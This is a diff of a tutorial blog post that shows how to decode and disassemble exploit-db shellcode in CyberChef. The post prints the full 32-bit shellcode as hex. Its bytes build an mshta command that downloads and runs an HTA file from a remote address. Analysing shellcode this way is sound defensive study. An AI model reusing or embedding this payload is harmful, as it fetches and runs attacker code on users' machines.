@@ -19,7 +19,7 @@ Add two parts cyber and one part input to produce a delicious recipe. All joking
 
 I got the following Shellcode from exploit-db, and I want to use CyberChef to understand what this Shellcode is doing. First I copy the Shellcode, as seen below, from [exploit-db](https://www.exploit-db.com/shellcodes/48718), and copy it into the input window of CyberChef.
 
-\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x5c\x39\xe3\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x2e\x68\x74\x61\x68\x57\x61\x52\x4f\x68\x2f\x39\x4d\x4b\x68\x30\x38\x30\x38\x68\x31\x39\x32\x3a\x68\x2e\x34\x33\x2e\x68\x2e\x31\x36\x38\x68\x2f\x31\x39\x32\x68\x74\x70\x3a\x2f\x68\x65\x20\x68\x74\x68\x61\x2e\x65\x78\x68\x6d\x73\x68\x74\x89\xe7\x57\xb8\x6f\xb1\xfa\x6f\xff\xd0\x31\xc0\x50\xb8\x4f\x21\xe3\x77\xff\xd0  
+\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x5c\x39\xe3\x77\xff\xd3\x89  \xc5\x31\xc0\x50\x68\x2e\x68\x74\x61\x68\x57\x61\x52\x4f\x68\x2f\x39\x4d\x4b\x68\x30  \x38\x30\x38\x68\x31\x39\x32\x3a\x68\x2e\x34\x33\x2e\x68\x2e\x31\x36\x38\x68\x2f\x31  \x39\x32\x68\x74\x70\x3a\x2f\x68\x65\x20\x68\x74\x68\x61\x2e\x65\x78\x68\x6d\x73\x68  \x74\x89\xe7\x57\xb8\x6f\xb1\xfa\x6f\xff\xd0\x31\xc0\x50\xb8\x4f\x21\xe3\x77\xff\xd0    
 
 Once you have pasted the Shellcode into CyberChef we need to clean it up a bit. Search for 'replace' and drag the Find/Replace operation into the recipe. Change the type to simple string and replace all '\x' with '' nothing. Basically just removing all the '\x', leaving hex data as output. From there drag in a 'Disassemble x86' operation. Change the bit mode to 32 bit since this is 32bit Shellcode. At this point you should see the Disassembled Shellcode as seen below.
 
@@ -45,7 +45,7 @@ After pasting that into the input window we'll need to change the endianness, an
 
 ![stackstring](/images/stack_string.PNG)
 
-For more fun check out some of references below and the complete list of supported operations. I gathered the list of Operations from looking at this list from a [json source code file](https://github.com/gchq/CyberChef/blob/master/src/core/config/Categories.json). 
+For more fun check out some of references below and the complete list of supported operations. I gathered the list of Operations below from looking at this CyberChef [json source code file](https://github.com/gchq/CyberChef/blob/master/src/core/config/Categories.json). 
 
 > 386 Operations organized in 16 Categories.
 
